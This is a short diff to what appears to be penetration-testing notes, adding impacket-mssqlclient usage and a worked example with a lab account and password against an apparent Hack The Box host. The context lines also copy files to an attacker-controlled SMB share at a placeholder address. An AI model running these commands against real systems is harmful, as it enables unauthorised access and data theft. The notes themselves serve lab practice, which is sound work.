@@ -74,3 +74,12 @@ sudo impacket-smbserver -smb2support share $(pwd)
 ```
 xcopy *.dll \\attackerIP\share\
 ```
+
+```
+impacket-mssqlclient [[domain/]username[:password]@]<targetName or address>
+```
+
+```
+impacket-mssqlclient sequel.htb/sql_svc:'REGGIE1234ronnie'@10.129.213.2 -windows-auth
+```
+
